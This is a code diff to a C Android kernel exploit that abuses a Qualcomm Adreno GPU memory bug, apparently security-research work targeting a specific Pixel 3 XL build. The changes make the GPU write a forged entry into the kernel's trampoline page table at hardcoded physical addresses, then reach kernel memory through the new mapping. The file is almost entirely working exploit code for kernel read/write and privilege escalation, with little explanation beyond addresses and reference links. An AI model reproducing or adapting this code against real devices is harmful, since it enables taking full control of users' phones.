@@ -261,7 +261,7 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     }
     fprintf(stderr, "\n");
 #endif
-    usleep(100000);
+    usleep(500000);
     // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
     // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
     int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
@@ -272,10 +272,31 @@ static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_g
     return 0;
 }
 
+const uint64_t kKernelPageTableEntry = 0x1e0;
+
 int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
 #ifdef DUMP_PAGEMAP
     int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY): -1;
 #endif
+
+    // crosshatch-rq1a.201205.003.a1
+    // /proc/iomem:
+    // 80080000-823fffff : Kernel code
+    // 82c00000-83885fff : Kernel data
+    // https://www.longterm.io/cve-2020-0423.html
+    // https://github.com/LineageOS/android_kernel_google_msm-4.9/blob/cf7420326fc9659917177acb536a2a9a8bf65bfc/arch/arm64/kernel/vmlinux.lds.S#L236
+    // https://duasynt.com/blog/android-pgd-page-tables
+    // https://docs.kernel.org/arch/arm64/booting.html
+    // kernel physical base + image_size - 0x1000 (tramp_pg_dir)
+    // Note that Pixel 3 XL has CONFIG_UNMAP_KERNEL_AT_EL0 for Meltdown mitigation:
+    // Pixel 4a (in duasynt.com) does not - that's why we target tramp_pg_dir instead of swapper_pg_dir
+    // https://developer.arm.com/-/media/Arm%20Developer%20Community/PDF/Kernel_Mitigations_Detail_v1.5.pdf?revision=a8859ae4-5256-47c2-8e35-a2f1160071bb&la=en
+    // https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20Binder%20-%20The%20Bridge%20to%20Root%20-%20Hongli%20Han%20&%20Mingjian%20Zhou.pdf
+    uint64_t tramp_pg_dir_phys = 0x80080000ull + 0x3806000ull - 0x1000ull;
+    uint64_t target_write_physical_address = tramp_pg_dir_phys + (kKernelPageTableEntry * sizeof(uint64_t));
+    uint64_t tramp_pte_target = 0x80000000;
+    uint64_t tramp_pte_value = tramp_pte_target | 0x00e8000000000751ull;
+
     // from Adrenaline: spray physical memory
     /* this is the physical address of the fake page table that we will point the SMMU TTBR0 to.
      *
@@ -306,7 +327,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
          * a fixed physical address that you can calculate by taking the base of "Kernel Code"
          * from /proc/iomem and then adding (sys_call_table - _text) from /proc/kallsyms */
         // zhuowei: actually, try to write to itself, please...
-        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, phyaddr);
+        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, target_write_physical_address & ~0xfffull);
 
         if (ret == -1) {
             fprintf(stderr, "setup_pagetables failed\n");
@@ -372,9 +393,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     // really stupid cache flush:
     memset(garbage, 0x1, kGarbageSize);
 
-    // Sign of life: just ask the GPU to write something...
-    uint32_t test_write = 0x42424242;
-    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, kFakeGpuAddr + 0x200, 1, &test_write)) {
+    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, kFakeGpuAddr + (target_write_physical_address & 0xfffull), 2, (uint32_t*)&tramp_pte_value)) {
         fprintf(stderr, "Can't do initial write\n");
         return 1;
     }
@@ -413,16 +432,6 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
         }
         pbufs[i] = NULL;
     }
-
-    cheese->fd = fd;
-    cheese->ctx_id = ctx_id;
-    cheese->payload_buf = payload_buf;
-    cheese->payload_gpuaddr = payload_gpuaddr;
-    cheese->output_buf = output_buf;
-    cheese->output_gpuaddr = output_gpuaddr;
-    cheese->target_physical_page = target_physical_page;
-    cheese->phyaddr = phyaddr;
-    cheese->garbage = garbage;
     return 0;
 }
 
@@ -467,21 +476,11 @@ int main() {
         fprintf(stderr, "can't get GPU r/w\n");
         return 1;
     }
-    // crosshatch-rq1a.201205.003.a1
-    // /proc/iomem:
-    // 80080000-823fffff : Kernel code
-    // 82c00000-83885fff : Kernel data
-    // /proc/kallsyms:
-    // ffffff80acbaa017 r linux_proc_banner
-    // ffffff80aac80000 T _text
-    uint64_t target_write_physical_address = 0x80080000ull + (0xffffff80acbaa018ull - 0xffffff80aac80000ull);
-    //               01234567
-    char value[8] = "p Hey1";
-    if (cheese_physwrite(&cheese, target_write_physical_address, 2, (uint32_t*)value)) {
-        fprintf(stderr, "can't write\n");
-        return 1;
-    }
-    sleep(1);
-    // now check /proc/version
+    sleep(2);
+    // now check ksma...
+    fprintf(stderr, "about to ksma...\n");
+    void* ksma_mapping = (void*)(0xffffff8000000000ull + kKernelPageTableEntry * 0x40000000ull);
+    uint32_t* mytarget = ksma_mapping + 0x80000 /* kernel */ + 0x38 /* kernel header magic: ARMd */;
+    fprintf(stderr, "%x\n", mytarget);
     return 0;
 }
